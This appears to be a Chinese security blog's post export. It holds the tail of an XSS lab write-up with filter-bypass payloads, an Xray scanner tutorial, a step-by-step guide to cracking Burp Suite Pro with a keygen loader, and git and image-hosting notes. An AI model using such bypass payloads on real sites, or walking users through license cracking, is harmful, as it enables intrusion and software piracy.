align=center&gt;欢迎来到level8&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars($str).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> $str7;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.$str7.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen($str7).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;a&#x27;)</span><br></pre></td></tr></table></figure>
<p>HTML编码后变成</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x27;</span><span class="symbol">&amp;#x29;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201128115320.png"></p>
<h3 id="不用javascript-和-lt-SCRIPT-绕过"><a href="#不用javascript-和-lt-SCRIPT-绕过" class="headerlink" title="不用javascript:和&lt;SCRIPT...绕过"></a>不用<code>javascript:</code>和<code>&lt;SCRIPT...</code>绕过</h3><p>有点网站会添加黑名单来实现过滤xss攻击<br>比如网站会过滤掉<code>javascript:</code>和<code>&lt;SCRIPT...</code><br>我们就可以用<code>&lt;body&gt;</code>标签在用<code>onload</code> 事件这个事件会在页面加载完成或执行一个js代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">a</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
        <category>xss漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Xray安全评估工具</title>
    <url>/2021/08/07/Xray/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>学习总结</strong></p>
<p>xray是长亭科技的一款社区版漏洞扫描工具</p>
<p>他的github项目地址：<a href="https://github.com/chaitin/xray%EF%BC%88%E4%B8%8D%E6%98%AF%E6%BA%90%E7%9A%84%E9%A1%B9%E7%9B%AE%EF%BC%89">https://github.com/chaitin/xray（不是源的项目）</a></p>
<p>官方使用文档：<a href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p>
<p><strong>目前支持的漏洞检测类型包括:</strong></p>
<ul>
<li>XSS漏洞检测 (key: xss)</li>
<li>SQL 注入检测 (key: sqldet)</li>
<li>命令/代码注入检测 (key: cmd-injection)</li>
<li>目录枚举 (key: dirscan)</li>
<li>路径穿越检测 (key: path-traversal)</li>
<li>XML 实体注入检测 (key: xxe)</li>
<li>文件上传检测 (key: upload)</li>
<li>弱口令检测 (key: brute-force)</li>
<li>jsonp 检测 (key: jsonp)</li>
<li>ssrf 检测 (key: ssrf)</li>
<li>基线检查 (key: baseline)</li>
<li>任意跳转检测 (key: redirect)</li>
<li>CRLF 注入 (key: crlf-injection)</li>
<li>Struts2 系列漏洞检测 (高级版，key: struts)</li>
<li>Thinkphp系列漏洞检测 (高级版，key: thinkphp)</li>
<li>POC 框架 (key: phantasm)</li>
</ul>
<p>其中 POC 框架默认内置 Github 上贡献的 poc，用户也可以根据需要自行构建 poc 并运行。</p>
<h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><p>下载地址：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a></p>
<p>我的系统是kali linux下载的是这个版本</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210702144539632.png" alt="image-20210702144539632"></p>
<p>安装好解压出来直接就可以用</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210702145148369.png" alt="image-20210702145148369"></p>
<p>查看版本<code>./xray_linux_amd64 version</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210702145232163.png" alt="image-20210702145232163"></p>
<h1 id="代理扫描"><a href="#代理扫描" class="headerlink" title="代理扫描"></a>代理扫描</h1><h2 id="证书安装"><a href="#证书安装" class="headerlink" title="证书安装"></a>证书安装</h2><h3 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h3><p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./xray_linux_amd64  genca </span><br></pre></td></tr></table></figure>
<p>他会生成两个文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210702145439858.png" alt="image-20210702145439858"></p>
<h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><p>我用的是谷歌浏览器</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210702145540051.png" alt="image-20210702145540051"></p>
<p>找到文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210702145607903.png" alt="image-20210702145607903"></p>
<h2 id="启动代理扫描"><a href="#启动代理扫描" class="headerlink" title="启动代理扫描"></a>启动代理扫描</h2><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;xray_linux_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210702150346836.png" alt="image-20210702150346836"></p>
<p>设置浏览器代理添加</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807121134994.png" alt="image-20210807121134994"><br>添加上面指定的ip和端口就可以了<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807121037509.png" alt="image-20210807121037509"></p>
<h2 id="设置指定扫描的网站"><a href="#设置指定扫描的网站" class="headerlink" title="设置指定扫描的网站"></a>设置指定扫描的网站</h2><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>这个代理扫描，如果我们访问其他网站他也会跟着扫描，我们就可以设置指定扫描的网站进行扫描</p>
</div> 

<p>我们如果进行扫描一次他就会生成一个<code>config.yaml</code>文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807172656908.png" alt="image-20210807172656908"></p>
<p><strong>找到<code>mitm</code>，如果是<code>*</code>就是代表全部的意思</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807172834615.png" alt="image-20210807172834615"></p>
<ul>
<li><code>hostname_allowed</code>代表允许扫描的目标名单</li>
<li><code>hostname_disallowed</code>代表不允许扫描的目标名单</li>
</ul>
<p><strong>测试一下</strong></p>
<p>我访问百度可以看到没有任何反应</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807173112156.png" alt="image-20210807173112156"></p>
<p>我访问指定运行扫描的网站他就会进行扫描</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807173204027.png" alt="image-20210807173204027"></p>
<h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><h2 id="xray-与-Burpsuite-联动"><a href="#xray-与-Burpsuite-联动" class="headerlink" title="xray 与 Burpsuite 联动"></a>xray 与 Burpsuite 联动</h2><div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>我们知道xray是可以代理的，Burpsuite工具也是可以代理的，我们就可以叫他俩的代理连接起来</p>
</div> 

<p>下面是他原理图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/2bc0fa0a0f17fc587346b1030e8822b6.png"></p>
<p>burp默认代理是8080端口</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812190050122.png" alt="image-20210812190050122"></p>
<p>在xray配置文件里面，配置成下面这样就可以叫请求发送给burp了</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="attr">proxy:</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>   <span class="string">//这个设置成burp的代理</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812190704988.png" alt="image-20210812190704988"></p>
<p>然后我访问百度可以看见burp就可以拦截请求了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812190752168.png" alt="image-20210812190752168"></p>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>我们只启动扫描的时候他会生成一个配置文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210807172656908.png" alt="image-20210807172656908"></p>
<h2 id="配置文件的大类"><a href="#配置文件的大类" class="headerlink" title="配置文件的大类"></a>配置文件的大类</h2><div class="note info simple"><p>默认他是展开的</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812101750540.png" alt="image-20210812101750540"></p>
<h1 id="更新中"><a href="#更新中" class="headerlink" title="更新中"></a>更新中</h1>]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Xray</category>
      </categories>
      <tags>
        <tag>Xray安全评估工具</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装burpsuite pro破解版2021版</title>
    <url>/2021/08/08/burp/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note danger simple"><p>小学英语不过关的我用英文版burp是很费劲的，burp是没有中文版</p>
</div>
<div class="note danger simple"><p>burp专业版要399美元，穷比我肯定是买不起的</p>
</div>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809165031274.png" alt="image-20210809165031274"></p>
<div class="note danger simple"><p>非常感谢的一个团队感谢他的付出burp汉化补丁<a href="https://github.com/funkyoummp/BurpSuiteCn/">https://github.com/funkyoummp/BurpSuiteCn/</a></p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809110534971.png" alt="image-20210809110534971"></p>
<div class="note warning simple"><p>linux系统burp进行破解可能比较繁琐</p>
</div>

<div class="note info simple"><p>我在漏洞挖用的最多的就是burpsuite，手动漏洞挖机测试的最好的工具没有之一、</p>
</div>

<div class="note info simple"><p>我之前一直用的是2.0.11版本这个版本也是用了好几年了，burp现在已经更新了好多版本了，什么都是用最新版本的软件好。<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809105039521.png" alt="image-20210809105039521"></p>
</div>

<div class="note info simple"><p>现在都2021.8.12了，肯定要用最新版的</p>
</div>









<h1 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h1><p><strong>其实全部的burp破解都是大同小异</strong></p>
<ul>
<li>安装启动环境</li>
<li>注册机</li>
<li>最新版burp</li>
<li>中文包</li>
</ul>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><ol>
<li><p>burp最新版下载地址<a href="https://portswigger.net/burp/releases">https://portswigger.net/burp/releases</a>我下载的是最新版的2021.8版本</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809121506452.png" alt="image-20210809121506452"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809130249089.png" alt="image-20210809130249089"></p>
</li>
<li><p>注册机下载地址<a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">https://github.com/h3110w0r1d-y/BurpLoaderKeygen</a></p>
</li>
<li><p>环境安装<a href="https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html</a>下载系统对应的版本，注意：这个要注册登录才能下载的，</p>
<p>下载<code>Linux x64 Compressed Archive</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809125438774.png" alt="image-20210809125438774"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809125751939.png" alt="image-20210809125751939"></p>
</li>
<li><p>汉化补丁下载<a href="https://github.com/funkyoummp/BurpSuiteCn/">https://github.com/funkyoummp/BurpSuiteCn/</a></p>
</li>
</ol>
<h1 id="环境安装配置"><a href="#环境安装配置" class="headerlink" title="环境安装配置"></a>环境安装配置</h1><div class="note info simple"><p>现在我这个kali的java版本也是可以的，可能在更新一个版本就不行了</p>
</div>



<div class="note info simple"><p>下面是java安装指定版本也是行动</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809125751939.png" alt="image-20210809125751939"><br>下面是配置java版本</p>
<p><strong>叫下载的jdkxxx.gz文件解压出来</strong></p>
<p>解压好进行配置运行下面的代码，下面的<code>/home/zss/YingYong/jdkxx/</code>是jdk解压出来的目录<br>1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JAVA_HOME=/home/zss/YingYong/jdkxx/</span><br></pre></td></tr></table></figure>
<p>2</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JRE_HOME=JAVAHOME/jreexportCLASSPATH=.:&#123;JAVA_HOME&#125;/lib:JREHOME/libexportPATH=&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>3</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /home/zss/YingYong/jdkxx/bin/java <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>4</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/javac javac /home/zss/YingYong/jdkxx/bin/javac <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>5</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /home/zss/YingYong/jdkxx/bin/java</span><br></pre></td></tr></table></figure>
<p>6</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /home/zss/YingYong/jdkxx/bin/java</span><br></pre></td></tr></table></figure>
<p>7</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> javac /home/zss/YingYong/jdkxx/bin/javac</span><br></pre></td></tr></table></figure>
<p>然后运行</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
<p>查看配置成功<br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/20191104132555181.png" alt="在这里插入图片描述"></p>
<h1 id="burpsuite-pro专业版安装"><a href="#burpsuite-pro专业版安装" class="headerlink" title="burpsuite pro专业版安装"></a>burpsuite pro专业版安装</h1><p>也可以叫kali自带的删除</p>
<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt remove burpsuite</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809130611131.png" alt="image-20210809130611131"></p>
<p>安装我们下载好的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809130249089.png" alt="image-20210809130249089"></p>
<p>设置可执行权限</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo chmod +x burpsuite_pro_linux_v2021_8.sh  </span><br></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./burpsuite_pro_linux_v2021_8.sh  </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809160824102.png" alt="image-20210809160824102"></p>
<p><strong>还有一个安装目录我没有截图截上选择同一个目录就可以了</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809161112974.png" alt="image-20210809161112974"></p>
<p>找到我们选择安装到目录可以看见里面多了好几个文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809161255259.png" alt="image-20210809161255259"></p>
<h1 id="Burp破解"><a href="#Burp破解" class="headerlink" title="Burp破解"></a>Burp破解</h1><div class="note info simple"><p>叫注册机文件复制到刚才我们按照的目录下</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809161615418.png" alt="image-20210809161615418"></p>
<div class="note info simple"><p>用配置的环境启动注册机</p>
</div>

<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -jar BurpLoaderKeygen.jar</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809161802077.png" alt="image-20210809161802077"></p>
<div class="note info simple"><p>应为我的物理机已经破解过下面是用的kali linux2021.2来演示的</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809134117189.png" alt="image-20210809134117189"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809134147966.png" alt="image-20210809134147966"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809134217500.png" alt="image-20210809134217500"></p>
<div class="note info simple"><p>点击下一步</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809134232681.png" alt="image-20210809134232681"></p>
<div class="note info simple"><p>启动成功</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809134258074.png" alt="image-20210809134258074"></p>
<h1 id="启动脚本没有破解问题"><a href="#启动脚本没有破解问题" class="headerlink" title="启动脚本没有破解问题"></a>启动脚本没有破解问题</h1><div class="note warning simple"><p>你破解完了后发现启动后还是没有破解的样子，其他是启动方法有问题</p>
</div>

<p>你可以创建一个脚本比如<code>burp.sh</code></p>
<p><code>burp.sh</code>文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -javaagent:BurpLoaderKeygen.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809164111027.png" alt="image-20210809164111027"></p>
<p>给他执行权限</p>
<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo chmod +x burp.sh </span><br></pre></td></tr></table></figure>
<p>启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./burp.sh </span><br></pre></td></tr></table></figure>
<p>发现就是破解好的状态了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809164132874.png" alt="image-20210809164132874"></p>
<h1 id="导入汉化插件"><a href="#导入汉化插件" class="headerlink" title="导入汉化插件"></a>导入汉化插件</h1><p>下载好的汉化插件复制到burp安装到目录</p>
<p>叫<code>burp.sh</code>脚本修改成下面这样</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=utf-8 -javaagent:BurpSuiteCnV2.0.jar  -javaagent:BurpLoaderKeygen.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809164311398.png" alt="image-20210809164311398"></p>
<p>启动脚本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./burp.sh</span><br></pre></td></tr></table></figure>
<p><strong>启动成功</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210809164446605.png" alt="image-20210809164446605"></p>
<h1 id="创建快捷方式"><a href="#创建快捷方式" class="headerlink" title="创建快捷方式"></a>创建快捷方式</h1><p>在   /usr/share/applications/     要.desktop为后缀 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]  文件头</span><br><span class="line">Encoding&#x3D;UTF-8		 编码</span><br><span class="line">Name&#x3D;BurpSuite 应用名称</span><br><span class="line">Exec&#x3D;&quot;java -Dfile.encoding&#x3D;utf-8 -javaagent:BurpSuiteCnV2.0.jar  -javaagent:BurpLoaderKeygen.jar -noverify -jar burpsuite_pro.jar</span><br><span class="line">&quot; %U 执行的命令</span><br><span class="line">Icon&#x3D;&#x2F;home&#x2F;zss&#x2F;YingYong&#x2F;Borpsuite2021&#x2F;BurpSuitePro&#x2F;.install4j&#x2F;BurpSuitePro.png  图标路径</span><br><span class="line">Categories&#x3D;Application;   应用的类型（内容相关）</span><br><span class="line">StartupWMClass&#x3D;install4j-burp-StartBurp</span><br></pre></td></tr></table></figure>
<p>保存后就可以看见文件了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812192316360.png" alt="image-20210812192316360"></p>
<p>或者在直接在程序菜单里面添加</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812192451000.png" alt="image-20210812192451000"></p>
<p>命令配置成下面这样，保存退出</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812192956654.png" alt="image-20210812192956654"></p>
<p>就可以看见启动器了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812193026971.png" alt="image-20210812193026971"></p>
<p>点击正常启动</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210812193128709.png" alt="image-20210812193128709"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>git基本命令</title>
    <url>/2021/03/16/git/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>时间少学习慢</strong></p>
<h1 id="git版本控制"><a href="#git版本控制" class="headerlink" title="git版本控制"></a>git版本控制</h1><div class="note info simple"><p>版本控制有两个 1. 分布式版本控制 2. 集中式版本控制</p>
</div>


<h2 id="集中式版本控制"><a href="#集中式版本控制" class="headerlink" title="集中式版本控制"></a>集中式版本控制</h2><p>就是叫一个中央服务器存在代码，我修改好的代码了给传送上去，这个项目的其他人在下载下来做他的项目，然后再上传上面。</p>
<p><strong>他有一个缺点就是服务器坏了，没有历史记录了</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210502112122566.png" alt="image-20210502112122566"></p>
<h2 id="分布式版本控制"><a href="#分布式版本控制" class="headerlink" title="分布式版本控制"></a>分布式版本控制</h2><p>分布式版本控制和集中式版本控制区别就是，每个开发者自己的电脑上都有自己的，完整版本库分布式版本控制系统可通过推送版本库到比如Github上面，实现项目共享开发</p>
<p><strong>就算服务器坏了，你自己也有完整的版本库</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210502113148806.png" alt="image-20210502113148806"></p>
<h1 id="git工作机制"><a href="#git工作机制" class="headerlink" title="git工作机制"></a>git工作机制</h1><ol>
<li>工作区：就是你的代码存放的那个目录</li>
<li>暂存区：工作区的代码需要用git add添加到暂存区</li>
<li>本地库：git commit命令叫暂存区提交到本地库就是历史版本</li>
<li>远程库：将代码从本地库推送到远程库用git pash</li>
</ol>
<h1 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安装</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub+jsdelivr+PicGo+typora照片存储</title>
    <url>/2021/02/09/githubtc/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note danger simple"><p>图床=图床一般是指储存图片的服务器，<a href="https://baike.baidu.com/item/%E5%9B%BE%E5%BA%8A">百度百科</a></p>
</div>

<div class="note info simple"><p>不知道怎么回事微信好像屏蔽gitee，导致我的很多照片加载失败404，马狗真的狗<img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/1ae57afb16cf85e.jpg" style="zoom:25%;" /></p>
</div>

<div class="note danger simple"><p>gitee的照片，写的笔记照片文章照片其他照片在这里面</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208214605606.png" alt="image-20210208214605606"></p>
<div class="note danger simple"><p>我的服务器也存放了不知道多少张照片，如果我修改了如何配置就会导致网站的照片无法加载</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210209112654263.png" alt="image-20210209112654263"></p>
<h1 id="为什么我要写这个文章"><a href="#为什么我要写这个文章" class="headerlink" title="为什么我要写这个文章"></a><strong>为什么我要写这个文章</strong></h1><div class="note info simple"><p>我用了很长时间的gitee的图床，国内的图床限制的多gitee限制在1m</p>
</div>



<div class="note info simple"><p>阿里云OSS，七牛云、又拍云、腾讯云COS要钱</p>
</div>

<div class="note info simple"><p>我就选择了大家都知道的GitHub上</p>
</div>

<h1 id="创建GitHub仓库"><a href="#创建GitHub仓库" class="headerlink" title="创建GitHub仓库"></a>创建GitHub仓库</h1><p>他的官方<a href="https://github.com/">github</a></p>
<p>如果没有账号可以用邮箱注册一个</p>
<div class="note info simple"><p>创建仓库</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208215852568.png" alt="image-20210208215852568"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210208220314394.png" alt="image-20210208220314394"></p>
